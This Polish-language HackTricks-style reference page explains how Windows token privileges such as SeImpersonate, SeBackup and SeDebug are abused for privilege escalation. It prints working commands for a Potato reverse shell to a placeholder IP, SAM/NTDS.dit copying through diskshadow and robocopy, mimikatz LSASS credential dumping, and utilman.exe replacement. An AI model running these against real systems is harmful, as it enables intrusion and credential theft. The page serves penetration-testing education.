# Nadużywanie tokenów

{{#include ../../banners/hacktricks-training.md}}

## Tokeny

Jeśli **nie wiesz, czym są Windows Access Tokens**, przeczytaj tę stronę przed kontynuowaniem:


{{#ref}}
access-tokens.md
{{#endref}}

**Być może uda Ci się podnieść uprawnienia, nadużywając posiadanych już tokenów**

### SeImpersonatePrivilege

To uprawnienie posiadane przez dowolny proces pozwala na impersonację (ale nie tworzenie) dowolnego tokenu, pod warunkiem że można uzyskać do niego uchwyt. Uprzywilejowany token można uzyskać z usługi Windows (DCOM), nakłaniając ją do wykonania uwierzytelniania NTLM przeciwko exploitowi, a następnie umożliwiając uruchomienie procesu z uprawnieniami SYSTEM.<sup>[[2]](#references)</sup> Tę lukę można wykorzystać za pomocą różnych narzędzi, takich jak [juicy-potato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (który wymaga wyłączenia winrm), [SweetPotato](https://github.com/CCob/SweetPotato) oraz [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Współczesne uwagi dla operatorów:

- **JuicyPotato jest przestarzały**: w systemach Windows 10 1809+ / Server 2019+ preferuj **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato** lub **PrintSpoofer**, zależnie od tego, która powierzchnia RPC/COM jest nadal dostępna.
- Jeśli uzyskałeś dostęp do usługi działającej jako **`LOCAL SERVICE`** lub **`NETWORK SERVICE`**, a `whoami /priv` pokazuje **filtered token** bez `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`, najpierw odzyskaj **default privilege set** konta (na przykład za pomocą **FullPowers**), a następnie ponów próbę użycia narzędzi z rodziny potato.<sup>[[3]](#references)</sup>
- Niektóre nowsze forki są wygodniejsze dla operatorów niż oryginalne narzędzia. Na przykład **SigmaPotato** dodaje wykonywanie przez reflection/in-memory execution oraz zgodność z nowoczesnymi wersjami Windows, podczas gdy **PrintNotifyPotato** wykorzystuje usługę PrintNotify COM i często jest przydatny, gdy klasyczna ścieżka Spooler jest wyłączona.
```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

Jest bardzo podobne do **SeImpersonatePrivilege** i wykorzystuje **tę samą metodę** do uzyskania uprzywilejowanego tokenu.\
Następnie uprawnienie to pozwala **przypisać token primary** do nowego lub wstrzymanego procesu. Za pomocą uprzywilejowanego tokenu impersonacji można utworzyć token primary (DuplicateTokenEx).\
Za pomocą tego tokenu można utworzyć **nowy proces** przy użyciu „CreateProcessAsUser” albo utworzyć proces w stanie wstrzymania i **ustawić token** (ogólnie nie można modyfikować tokenu primary działającego procesu).<sup>[[2]](#references)</sup>

### SeTcbPrivilege

Jeśli ten token jest włączony, można użyć **KERB_S4U_LOGON**, aby uzyskać **token impersonacji** dowolnego innego użytkownika bez znajomości danych uwierzytelniających, **dodać dowolną grupę** (admins) do tokenu, ustawić **poziom integralności** tokenu na „**medium**” oraz przypisać ten token do **bieżącego wątku** (SetThreadToken).<sup>[[2]](#references)</sup>

### SeBackupPrivilege

To uprawnienie powoduje, że system **przyznaje pełny dostęp do odczytu** dowolnego pliku (ograniczony do operacji odczytu). Jest ono wykorzystywane do **odczytywania hashy haseł lokalnych** kont Administrator z rejestru, a następnie narzędzia takie jak „**psexec**” lub „**wmiexec**” mogą użyć hasha (technika Pass-the-Hash). Ta technika zawodzi jednak w dwóch przypadkach: gdy konto Local Administrator jest wyłączone albo gdy obowiązuje zasada usuwająca uprawnienia administracyjne użytkowników Local Administrators łączących się zdalnie.<sup>[[2]](#references)</sup>\
W praktyce najbardziej niezawodnym wbudowanym workflow jest zwykle **VSS + `robocopy /b`**: utworzenie lub udostępnienie shadow copy, a następnie skopiowanie `SAM`/`SYSTEM` albo `NTDS.dit` w **trybie backupu**, co omija listy ACL plików.<sup>[[4]](#references)</sup>
```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```
Możesz **abuse this privilege** za pomocą:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- śledząc **IppSec** w [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Lub zgodnie z wyjaśnieniem w sekcji **escalating privileges with Backup Operators**:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

To privilege zapewnia **write access** do dowolnego pliku systemowego, niezależnie od jego Access Control List (ACL). Otwiera to wiele możliwości eskalacji, w tym możliwość **modyfikowania usług**, przeprowadzania DLL Hijacking oraz ustawiania **debuggerów** za pomocą Image File Execution Options, a także stosowania różnych innych technik.<sup>[[2]](#references)</sup>

### SeCreateTokenPrivilege

SeCreateTokenPrivilege to potężne uprawnienie, szczególnie przydatne, gdy użytkownik posiada możliwość impersonacji tokenów, ale także w przypadku braku SeImpersonatePrivilege. Możliwość ta zależy od zdolności do impersonacji tokena reprezentującego tego samego użytkownika i mającego poziom integralności nie wyższy niż bieżący proces.<sup>[[2]](#references)</sup>

**Najważniejsze informacje:**

- **Impersonacja bez SeImpersonatePrivilege:** Możliwe jest wykorzystanie SeCreateTokenPrivilege do EoP poprzez impersonację tokenów w określonych warunkach.
- **Warunki impersonacji tokena:** Pomyślna impersonacja wymaga, aby docelowy token należał do tego samego użytkownika i miał poziom integralności mniejszy lub równy poziomowi integralności procesu próbującego przeprowadzić impersonację.
- **Tworzenie i modyfikowanie tokenów impersonacji:** Użytkownicy mogą utworzyć token impersonacji i rozszerzyć go poprzez dodanie SID (Security Identifier) uprzywilejowanej grupy.

### SeLoadDriverPrivilege

To privilege umożliwia **ładowanie i wyładowywanie sterowników urządzeń** poprzez utworzenie wpisu w rejestrze z określonymi wartościami `ImagePath` i `Type`. Ponieważ bezpośredni write access do `HKLM` (HKEY_LOCAL_MACHINE) jest ograniczony, należy użyć `HKCU` (HKEY_CURRENT_USER). Aby jednak kernel rozpoznał `HKCU` podczas konfiguracji sterownika, należy zastosować określoną ścieżkę.<sup>[[2]](#references)</sup>

Współczesne offensive use zazwyczaj polega na **BYOVD** (bring your own vulnerable driver): załadowaniu **podpisanego, ale podatnego** sterownika kernela, a następnie użyciu jego IOCTL do wyłączenia zabezpieczeń lub uzyskania kernel code execution. Należy pamiętać, że w nowszych kompilacjach Windows 11/Server **Microsoft vulnerable driver blocklist** i/lub **HVCI/Memory Integrity** często uniemożliwiają działanie starszych publicznych chainów, dlatego klasyczne przykłady w stylu `szkg64.sys` nie są już niezawodne we wszystkich przypadkach.

Ścieżka ta to `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, gdzie `<RID>` oznacza Relative Identifier bieżącego użytkownika. W `HKCU` należy utworzyć całą tę ścieżkę oraz ustawić dwie wartości:<sup>[[2]](#references)</sup>

- `ImagePath`, czyli ścieżkę do uruchamianego pliku binarnego
- `Type` z wartością `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Kroki:**

1. Uzyskaj dostęp do `HKCU` zamiast `HKLM` z powodu ograniczonego write access.
2. Utwórz w `HKCU` ścieżkę `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, gdzie `<RID>` oznacza Relative Identifier bieżącego użytkownika.
3. Ustaw `ImagePath` na ścieżkę uruchamiania pliku binarnego.
4. Ustaw `Type` jako `SERVICE_KERNEL_DRIVER` (`0x00000001`).
```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```
Więcej sposobów na nadużycie tego uprawnienia opisano w [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

Jest to podobne do **SeRestorePrivilege**. Jego główna funkcja umożliwia procesowi **przejęcie własności obiektu**, omijając wymóg jawnego dostępu uznaniowego poprzez przyznanie praw dostępu WRITE_OWNER. Proces polega najpierw na przejęciu własności wybranego klucza rejestru w celu jego modyfikacji, a następnie na zmianie listy DACL, aby umożliwić operacje zapisu.<sup>[[2]](#references)</sup>
```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```
### SeDebugPrivilege

To uprawnienie umożliwia **debugowanie innych procesów**, w tym odczytywanie i zapisywanie ich pamięci. Dzięki temu uprawnieniu można stosować różne strategie memory injection, zdolne do omijania większości rozwiązań antivirus i host intrusion prevention.<sup>[[2]](#references)</sup>

W nowoczesnym systemie Windows pamiętaj, że `SeDebugPrivilege` zwykle wystarcza do otwierania **niechronionych procesów SYSTEM** i duplikowania ich tokenów, ale **nie gwarantuje możliwości uzyskania dostępu do** **LSASS**. Jeśli włączone są **RunAsPPL / LSA Protection**, niechronione procesy nie mogą odczytywać pamięci LSASS ani wykonywać do niego injection, nawet gdy obecne jest `SeDebugPrivilege`. W takim przypadku przejmij token z innego niechronionego procesu SYSTEM albo połącz tę technikę z PPL bypass/BYOVD, zamiast zakładać, że `procdump` zadziała. Pełny przykład kopiowania tokenu przy użyciu `SeDebugPrivilege` + `SeImpersonatePrivilege` znajdziesz [na tej stronie](sedebug-+-seimpersonate-copy-token.md).

#### Zrzut pamięci

Możesz użyć [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) z pakietu [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite), aby **przechwycić pamięć procesu**. W szczególności można zastosować to do procesu **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)**, który odpowiada za przechowywanie poświadczeń użytkownika po pomyślnym zalogowaniu się do systemu.

Następnie możesz załadować ten dump do mimikatz, aby uzyskać hasła:
```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
#### RCE

Jeśli chcesz uzyskać powłokę `NT SYSTEM`, możesz użyć:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```
### SeManageVolumePrivilege

To uprawnienie (Perform volume maintenance tasks) pozwala otwierać uchwyty surowych urządzeń woluminów (np. \\.\C:) w celu wykonywania bezpośrednich operacji we/wy na dysku z pominięciem list kontroli dostępu NTFS. Dzięki niemu można kopiować bajty dowolnego pliku z woluminu, odczytując bazowe bloki, co umożliwia odczyt dowolnych plików zawierających poufne dane (np. kluczy prywatnych maszyny w %ProgramData%\Microsoft\Crypto\, hive'ów rejestru oraz SAM/NTDS za pośrednictwem VSS).<sup>[[5]](#references)</sup> Jest to szczególnie istotne na serwerach CA, gdzie eksfiltracja prywatnego klucza CA umożliwia utworzenie Golden Certificate i podszycie się pod dowolnego principal.<sup>[[6]](#references)</sup>

Zobacz szczegółowe techniki i sposoby przeciwdziałania:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## Sprawdź uprawnienia
```
whoami /priv
```
Tokeny oznaczone jako **Disabled** można zwykle włączyć, dlatego często można wykorzystać zarówno uprawnienia _Enabled_, jak i _Disabled_.

### Włącz wszystkie tokeny

Jeśli masz wyłączone uprawnienia, możesz użyć skryptu [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1), aby włączyć wszystkie tokeny:
```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```
Lub **skrypt** osadzony w tym [**poście**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Tabela

Pełna ściągawka dotycząca uprawnień tokenów znajduje się pod adresem [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin), poniższe podsumowanie zawiera tylko bezpośrednie sposoby wykorzystania uprawnienia do uzyskania sesji administratora lub odczytu poufnych plików.<sup>[[1]](#references)</sup>

| Uprawnienie                | Wpływ       | Narzędzie                | Ścieżka wykonania                                                                                                                                                                                                                                                                                                                                    | Uwagi                                                                                                                                                                                                                                                                                                                        |
| -------------------------- | ----------- | ------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | narzędzie firm trzecich  | _"Pozwala użytkownikowi podszywać się pod tokeny i uzyskać privesc do nt system za pomocą narzędzi takich jak potato.exe, rottenpotato.exe i juicypotato.exe"_                                                                                                                                                                                       | Dziękuję [Aurélien Chalot](https://twitter.com/Defte_) za aktualizację. Wkrótce spróbuję sformułować to w bardziej przypominający przepis sposób.                                                                                                                                                                                         |
| **`SeBackup`**             | **Zagrożenie** | _**Wbudowane polecenia**_ | Odczyt poufnych plików za pomocą `robocopy /b` lub dedykowanych helperów kopiowania obsługujących SeBackup.                                                                                                                                                                                                                                         | <p>- Świetne rozwiązanie dla `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit`, a czasami także `%WINDIR%\MEMORY.DMP`.<br><br>- `robocopy` jest wygodne, ale dedykowane cmdlety/API SeBackup są często bardziej elastyczne w przypadku zablokowanych/otwartych plików.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | narzędzie firm trzecich  | Utworzenie dowolnego tokenu, w tym z lokalnymi uprawnieniami administratora, za pomocą `NtCreateToken`.                                                                                                                                                                                                                                            |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**            | Zduplikowanie tokenu SYSTEM **niebędącego PPL** lub zrzut pamięci z niezabezpieczonego procesu.                                                                                                                                                                                                                                                       | <p>Zrzut LSASS jest często blokowany, jeśli włączone są RunAsPPL/LSA Protection.</p><p>Skrypt znajduje się na stronie [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | narzędzie firm trzecich  | Użycie **rodziny Potato** / podszywania się przez named pipe do uruchomienia SYSTEM (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato` itd.).                                                                                                                                                                      | <p>Najbardziej praktyczne w przypadku kont usług, takich jak IIS APPPOOL, MSSQL, zadań zaplanowanych lub dowolnego kontekstu, który już posiada `SeImpersonatePrivilege`.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | narzędzie firm trzecich  | <p>1. Załaduj podpisany, ale podatny sterownik kernela (BYOVD)<br>2. Użyj IOCTL sterownika, aby uzyskać kernelowe R/W, wyłączyć narzędzia zabezpieczające lub uzyskać uprawnienia SYSTEM<br><br>Alternatywnie uprawnienie może służyć do wyładowywania sterowników związanych z bezpieczeństwem za pomocą wbudowanego polecenia <code>fltMC</code>, np. <code>fltMC sysmondrv</code></p>                     | <p>Starsze publicznie dostępne sterowniki, takie jak <code>szkg64.sys</code>, są coraz częściej blokowane w nowoczesnym systemie Windows przez listę blokowanych podatnych sterowników / HVCI.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**            | <p>1. Uruchom PowerShell/ISE z obecnym uprawnieniem SeRestore.<br>2. Włącz uprawnienie za pomocą <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Zmień nazwę utilman.exe na utilman.old<br>4. Zmień nazwę cmd.exe na utilman.exe<br>5. Zablokuj konsolę i naciśnij Win+U</p> | <p>Atak może zostać wykryty przez niektóre programy AV.</p><p>Alternatywna metoda polega na zastąpieniu plików binarnych usług przechowywanych w "Program Files" przy użyciu tego samego uprawnienia</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Wbudowane polecenia**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. Zmień nazwę cmd.exe na utilman.exe<br>4. Zablokuj konsolę i naciśnij Win+U</p>                                                                                                                                       | <p>Atak może zostać wykryty przez niektóre programy AV.</p><p>Alternatywna metoda polega na zastąpieniu plików binarnych usług przechowywanych w "Program Files" przy użyciu tego samego uprawnienia.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | narzędzie firm trzecich  | <p>Manipulowanie tokenami w celu uwzględnienia lokalnych uprawnień administratora. Może wymagać SeImpersonate.</p><p>Do weryfikacji.</p>                                                                                                                                                                                                             |                                                                                                                                                                                                                                                                                                                                |

## References

- [1] [gtworek/Priv2Admin - exploitation paths from Windows privileges to admin](https://github.com/gtworek/Priv2Admin)
- [2] [Abusing Token Privileges For LPE](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)
- [3] [itm4n – Give Me Back My Privileges! Please?](https://itm4n.github.io/localservice-privileges/)
- [4] [Microsoft – Robocopy (`/b` backup mode bypasses file/folder ACL checks)](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [5] [Microsoft – Perform volume maintenance tasks (SeManageVolumePrivilege)](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks)
- [6] [0xdf – HTB: Certificate (SeManageVolumePrivilege → CA key exfil → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../banners/hacktricks-training.md}}
